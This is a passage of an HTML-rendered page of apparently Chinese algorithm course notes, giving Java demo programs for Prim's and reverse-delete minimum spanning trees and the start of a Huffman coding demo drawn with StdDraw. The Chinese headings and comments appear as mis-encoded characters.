class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Arrays;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PrimDemo</span> {<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {<br>        <span class="hljs-type">int</span> vN=<span class="hljs-number">9</span>,eN=<span class="hljs-number">17</span>,count;<br>        count = vN;<br>        <span class="hljs-type">int</span>[] cN=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[vN];<br>        <span class="hljs-type">int</span>[] cS=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[vN];<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;vN;i++){<br>            cN[i]=i;<br>            cS[i]=<span class="hljs-number">1</span>;<br>        }<br>        <span class="hljs-type">int</span>[] c=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[eN];<br>        <span class="hljs-type">int</span>[] c2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[eN];<br>        <span class="hljs-type">int</span>[] flagEOG=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[eN];<br>        <span class="hljs-type">int</span>[] flagVOG=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[vN];<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;vN;i++){<br>            flagVOG[i]=<span class="hljs-number">0</span>;<br>        }<br>        <span class="hljs-type">int</span>[][] e ={{<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>},{<span class="hljs-number">1</span>,<span class="hljs-number">4</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">6</span>,<span class="hljs-number">4</span>,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>,<span class="hljs-number">4</span>,<span class="hljs-number">8</span>,<span class="hljs-number">7</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">8</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">8</span>}};<br>        <span class="hljs-type">int</span> N=vN;<br>        <span class="hljs-type">int</span> beishu=<span class="hljs-number">9</span>;<br>        <span class="hljs-type">int</span>[] x={<span class="hljs-number">4</span>,<span class="hljs-number">1</span>,<span class="hljs-number">7</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>,<span class="hljs-number">8</span>,<span class="hljs-number">1</span>,<span class="hljs-number">6</span>,<span class="hljs-number">3</span>};<br>        <span class="hljs-type">int</span>[] y={<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">4</span>,<span class="hljs-number">6</span>,<span class="hljs-number">6</span>,<span class="hljs-number">8</span>};<br>        StdDraw.setXscale(<span class="hljs-number">0</span>,beishu);<br>        StdDraw.setYscale(<span class="hljs-number">0</span>,beishu);<br>        StdDraw.setPenRadius(<span class="hljs-number">0.005</span>);<br>        <span class="hljs-type">int</span> v3;<br>        <span class="hljs-type">int</span> v4;<br>        <span class="hljs-type">int</span>[][] e2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">2</span>][eN];<br>        <span class="hljs-type">int</span>[] flagX=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[eN];<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;eN;i++){<br>            v3=e[<span class="hljs-number">0</span>][i];<br>            v4=e[<span class="hljs-number">1</span>][i];<br>            flagX[i]=<span class="hljs-number">1</span>;<br>            c[i]=(x[v3]-x[v4])*(x[v3]-x[v4])+(y[v3]-y[v4])*(y[v3]-y[v4]);<br>            c2[i]=c[i];<br>            flagEOG[i]=<span class="hljs-number">0</span>;<br>        }<br>        Arrays.sort(c);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;eN;i++){<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;eN;j++){<br>                <span class="hljs-keyword">if</span>(c[i]==c2[j]&amp;&amp;flagX[j]==<span class="hljs-number">1</span>){<br>                    e2[<span class="hljs-number">0</span>][i]=e[<span class="hljs-number">0</span>][j];<br>                    e2[<span class="hljs-number">1</span>][i]=e[<span class="hljs-number">1</span>][j];<br>                    flagX[j]=<span class="hljs-number">0</span>;<br>                    <span class="hljs-keyword">break</span>;<br>                }<br>            }<br>        }<br>        <span class="hljs-type">int</span> fV=(<span class="hljs-type">int</span>)(Math.random()*vN);<br>        flagVOG[fV]=<span class="hljs-number">1</span>;<br>        <span class="hljs-type">int</span> szj1,szj2;<br>        <span class="hljs-keyword">while</span> (count&gt;=<span class="hljs-number">1</span>){<br>            <span class="hljs-keyword">if</span>(count==<span class="hljs-number">1</span>){<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;eN;i++){<br>                    <span class="hljs-type">int</span> v1,v2;<br>                    v1=e2[<span class="hljs-number">0</span>][i];<br>                    v2=e2[<span class="hljs-number">1</span>][i];<br><br>                    <span class="hljs-keyword">if</span>(flagEOG[i]==<span class="hljs-number">1</span>){<br>                        StdDraw.setPenColor(StdDraw.RED);<br>                        StdDraw.line(x[v1],y[v1],x[v2],y[v2]);<br>                    }<br>                    <span class="hljs-keyword">else</span> {<br>                        StdDraw.setPenColor(StdDraw.BLACK);<br>                        StdDraw.line(x[v1],y[v1],x[v2],y[v2]);<br>                    }<br>                }<br>                <span class="hljs-keyword">break</span>;<br>            }<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> k=<span class="hljs-number">0</span>;k&lt;eN;k++){<br>                szj1=e2[<span class="hljs-number">0</span>][k];<br>                szj2=e2[<span class="hljs-number">1</span>][k];<br>                <span class="hljs-keyword">if</span>(flagEOG[k]==<span class="hljs-number">0</span>&amp;&amp;((flagVOG[szj2]==<span class="hljs-number">0</span>&amp;&amp;flagVOG[szj1]==<span class="hljs-number">1</span>)||(flagVOG[szj2]==<span class="hljs-number">1</span>&amp;&amp;flagVOG[szj1]==<span class="hljs-number">0</span>))){<br>                    flagEOG[k]=<span class="hljs-number">1</span>;<br>                    <span class="hljs-keyword">if</span>(flagVOG[szj2]==<span class="hljs-number">0</span>){<br>                        flagVOG[szj2]=<span class="hljs-number">1</span>;<br>                    }<br>                    <span class="hljs-keyword">else</span> {<br>                        flagVOG[szj1]=<span class="hljs-number">1</span>;<br>                    }<br>                    count--;<br>                    <span class="hljs-keyword">break</span>;<br>                }<br>            }<br>        }<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure><h4 id="åå‘åˆ é™¤"><a href="#åå‘åˆ é™¤" class="headerlink" title="åå‘åˆ é™¤"></a>åå‘åˆ é™¤</h4><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Arrays;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReverseDeleteDemo</span> {<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {<br>        <span class="hljs-type">int</span> <span class="hljs-variable">vN</span> <span class="hljs-operator">=</span> <span class="hljs-number">9</span>, eN = <span class="hljs-number">17</span>, count;<br>        count = vN;<br>        <span class="hljs-type">int</span>[] c = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[eN];<br>        <span class="hljs-type">int</span>[] flagv = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[vN];<br>        <span class="hljs-type">int</span>[] c2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[eN];<br>        <span class="hljs-type">int</span>[] flagEOG = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[eN];<br>        <span class="hljs-type">int</span>[][] e = {{<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>}, {<span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">7</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">8</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>}};<br>        <span class="hljs-type">int</span>[][] flag = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[vN][vN];<br>        <span class="hljs-type">int</span> <span class="hljs-variable">N</span> <span class="hljs-operator">=</span> vN;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">beishu</span> <span class="hljs-operator">=</span> <span class="hljs-number">9</span>;<br>        <span class="hljs-type">int</span>[] x = {<span class="hljs-number">4</span>, <span class="hljs-number">1</span>, <span class="hljs-number">7</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">3</span>};<br>        <span class="hljs-type">int</span>[] y = {<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <span class="hljs-number">6</span>, <span class="hljs-number">6</span>, <span class="hljs-number">8</span>};<br>        StdDraw.setXscale(<span class="hljs-number">0</span>, beishu);<br>        StdDraw.setYscale(<span class="hljs-number">0</span>, beishu);<br>        StdDraw.setPenRadius(<span class="hljs-number">0.005</span>);<br>        <span class="hljs-type">int</span> v3;<br>        <span class="hljs-type">int</span> v4;<br>        <span class="hljs-type">int</span>[][] e2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">2</span>][eN];<br>        <span class="hljs-type">int</span>[] flagX = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[eN];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; eN; i++) {<br>            v3 = e[<span class="hljs-number">0</span>][i];<br>            v4 = e[<span class="hljs-number">1</span>][i];<br>            flagX[i] = <span class="hljs-number">1</span>;<br>            c[i] = (x[v3] - x[v4]) * (x[v3] - x[v4]) + (y[v3] - y[v4]) * (y[v3] - y[v4]);<br>            c2[i] = c[i];<br>            flagEOG[i] = <span class="hljs-number">1</span>;<br>        }<br>        Arrays.sort(c);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; eN; i++) {<br>            flag[e[<span class="hljs-number">0</span>][i]][e[<span class="hljs-number">1</span>][i]] = <span class="hljs-number">1</span>;<br>            flag[e[<span class="hljs-number">1</span>][i]][e[<span class="hljs-number">0</span>][i]] = <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; j &lt; eN; j++) {<br>                <span class="hljs-keyword">if</span> (c[i] == c2[j] &amp;&amp; flagX[j] == <span class="hljs-number">1</span>) {<br>                    e2[<span class="hljs-number">0</span>][i] = e[<span class="hljs-number">0</span>][j];<br>                    e2[<span class="hljs-number">1</span>][i] = e[<span class="hljs-number">1</span>][j];<br>                    flagX[j] = <span class="hljs-number">0</span>;<br>                    <span class="hljs-keyword">break</span>;<br>                }<br>            }<br>        }<br>        <span class="hljs-type">int</span> szj1, szj2;<br>        <span class="hljs-keyword">while</span> (count &gt;= <span class="hljs-number">1</span>) {<br>            <span class="hljs-keyword">if</span> (count == <span class="hljs-number">1</span>) {<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; eN; i++) {<br>                    <span class="hljs-type">int</span> v1, v2;<br>                    v1 = e2[<span class="hljs-number">0</span>][i];<br>                    v2 = e2[<span class="hljs-number">1</span>][i];<br>                    <span class="hljs-keyword">if</span> (flagEOG[i] == <span class="hljs-number">1</span>) {<br>                        StdDraw.setPenColor(StdDraw.RED);<br>                        StdDraw.line(x[v1], y[v1], x[v2], y[v2]);<br>                    } <span class="hljs-keyword">else</span> {<br>                        StdDraw.setPenColor(StdDraw.BLACK);<br>                        StdDraw.line(x[v1], y[v1], x[v2], y[v2]);<br>                    }<br>                }<br>                <span class="hljs-keyword">break</span>;<br>            }<br>            <span class="hljs-type">int</span> <span class="hljs-variable">cmN</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">k</span> <span class="hljs-operator">=</span> eN - <span class="hljs-number">1</span>; k &gt;= <span class="hljs-number">0</span>; k--) {<br>                szj1 = e2[<span class="hljs-number">0</span>][k];<br>                szj2 = e2[<span class="hljs-number">1</span>][k];<br>                flag[szj1][szj2] = <span class="hljs-number">0</span>;<br>                flag[szj2][szj1] = <span class="hljs-number">0</span>;<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; vN; i++) {<br>                    flagv[i] = <span class="hljs-number">1</span>;<br>                }<br>                cmN = dft(szj1, flag, flagv, vN);<br>                <span class="hljs-keyword">if</span> (cmN == vN) {<br>                    flagEOG[k] = <span class="hljs-number">0</span>;<br>                } <span class="hljs-keyword">else</span> {<br>                    flag[szj1][szj2] = <span class="hljs-number">1</span>;<br>                    flag[szj2][szj1] = <span class="hljs-number">1</span>;<br>                }<br>            }<br>            count = <span class="hljs-number">1</span>;<br>        }<br>    }<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">dft</span><span class="hljs-params">(<span class="hljs-type">int</span> v, <span class="hljs-type">int</span>[][] flag, <span class="hljs-type">int</span>[] flagv, <span class="hljs-type">int</span> vN)</span> {<br>        <span class="hljs-type">int</span> count=<span class="hljs-number">1</span>;<br>        flagv[v]=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;vN;i++){<br>            <span class="hljs-keyword">if</span>(flag[v][i]==<span class="hljs-number">1</span>&amp;&amp;flagv[i]==<span class="hljs-number">1</span>){<br>                count=count+dft(i,flag,flagv,vN);<br>            }<br>        }<br>        <span class="hljs-keyword">return</span> count;<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure><h2 id="ç¬¬å››ç« "><a href="#ç¬¬å››ç« " class="headerlink" title="ç¬¬å››ç« "></a>ç¬¬å››ç« </h2><h3 id="å“ˆå¤«æ›¼ç¼–ç "><a href="#å“ˆå¤«æ›¼ç¼–ç " class="headerlink" title="å“ˆå¤«æ›¼ç¼–ç "></a>å“ˆå¤«æ›¼ç¼–ç </h3><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.*;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HuffmanDemo</span> {<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {<br>        <span class="hljs-type">int</span> <span class="hljs-variable">rr</span> <span class="hljs-operator">=</span> <span class="hljs-number">3</span>;<br>        <span class="hljs-comment">//int count=10;</span><br>        <span class="hljs-comment">//char[] cS = {'a','b','c','d','e','f','g','h','i','j'};</span><br>        <span class="hljs-comment">//double[] dF={0.18,0.15,0.11,0.07,0.27,0.019,0.01,0.02,0.17,0.001};</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">7</span>;<br>        <span class="hljs-type">char</span>[] cS = {<span class="hljs-string">'a'</span>, <span class="hljs-string">'e'</span>, <span class="hljs-string">'i'</span>, <span class="hljs-string">'s'</span>, <span class="hljs-string">'t'</span>, <span class="hljs-string">'b'</span>, <span class="hljs-string">'n'</span>};<br>        <span class="hljs-type">double</span>[] dF = {<span class="hljs-number">0.1</span>, <span class="hljs-number">0.15</span>, <span class="hljs-number">0.12</span>, <span class="hljs-number">0.03</span>, <span class="hljs-number">0.04</span>, <span class="hljs-number">0.13</span>, <span class="hljs-number">0.01</span>};<br>        <span class="hljs-type">int</span>[] dF2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[count];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; count; i++) {<br>            dF2[i] = (<span class="hljs-type">int</span>) (dF[i] * <span class="hljs-number">1000</span>);<br>        }<br>        <span class="hljs-type">int</span>[][] dPS = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">3</span>][count];<br>        dPS[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; count; i++) {<br>            dPS[<span class="hljs-number">0</span>][i] = dF2[i];<br>            dPS[<span class="hljs-number">1</span>][i] = i;<br>            insertHeap(dPS, i + <span class="hljs-number">1</span>);<br>            dPS[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] = dPS[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] + <span class="hljs-number">1</span>;<br>        }<br>        <span class="hljs-type">int</span>[][] cHT = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">4</span>][count * <span class="hljs-number">2</span>];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; count; i++) {<br>            cHT[<span class="hljs-number">0</span>][i] = i;<br>            cHT[<span class="hljs-number">1</span>][i] = -<span class="hljs-number">1</span>;<br>            cHT[<span class="hljs-number">2</span>][i] = -<span class="hljs-number">1</span>;<br>            cHT[<span class="hljs-number">3</span>][i] = <span class="hljs-number">1</span>;<br>        }<br>        <span class="hljs-type">int</span> <span class="hljs-variable">beishu</span> <span class="hljs-operator">=</span> count * rr * <span class="hljs-number">4</span>;<br>        StdDraw.setXscale(<span class="hljs-number">0</span>, beishu);<br>        StdDraw.setYscale(<span class="hljs-number">0</span>, beishu);<br>        StdDraw.setPenRadius(<span class="hljs-number">0.005</span>);<br>        <span class="hljs-type">int</span> <span class="hljs-variable">root</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">n</span> <span class="hljs-operator">=</span> count;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">count2</span> <span class="hljs-operator">=</span> count;<br>        <span class="hljs-keyword">while</span> (count &gt;= <span class="hljs-number">1</span>) {<br>            <span class="hljs-keyword">if</span> (count == <span class="hljs-number">1</span>) {<br>                <span class="hljs-comment">//è¾“å‡ºæ˜¾ç¤ºå“ˆå¤«æ›¼æ ‘</span><br>                inOrderPaint(root, cS, cHT, count2 * <span class="hljs-number">5</span>, count2 * <span class="hljs-number">4</span> * rr - <span class="hljs-number">10</span>, rr, count2 * <span class="hljs-number">1.9</span>);<br>                <span class="hljs-keyword">break</span>;<br>            }<br>            <span class="hljs-type">int</span> <span class="hljs-variable">mF</span> <span class="hljs-operator">=</span> dPS[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>];<br>            <span class="hljs-type">int</span> <span class="hljs-variable">f1</span> <span class="hljs-operator">=</span> dPS[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>];<br>            <span class="hljs-comment">//ä»ä¼˜å…ˆé˜Ÿåˆ—ä¸­å–å‡ºé¢‘ç‡æœ€å°çš„ç»“ç‚¹</span><br>            dPS[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = dPS[<span class="hljs-number">0</span>][dPS[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>]-<span class="hljs-number">1</span>];<br>            dPS[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] = dPS[<span class="hljs-number">1</span>][dPS[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>]-<span class="hljs-number">1</span>];<br>            <span class="hljs-comment">//ä»ä¼˜å…ˆé˜Ÿåˆ—æœ€åç»“ç‚¹æ”¾åˆ°ç¬¬ä¸€ä¸ªç»“ç‚¹çš„ä½ç½®</span><br>            dPS[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] = dPS[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] - <span class="hljs-number">1</span>;<br>            deleteHeap(dPS, <span class="hljs-number">1</span>);<br>            <span class="hljs-comment">//é‡æ–°è°ƒæ•´ä¸ºæ–°çš„ä¼˜å…ˆé˜Ÿåˆ—</span><br>            <span class="hljs-type">int</span> <span class="hljs-variable">mS</span> <span class="hljs-operator">=</span> dPS[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>];<br>            <span class="hljs-type">int</span> <span class="hljs-variable">f2</span> <span class="hljs-operator">=</span> dPS[<span class="hljs-number">0</span>][<span 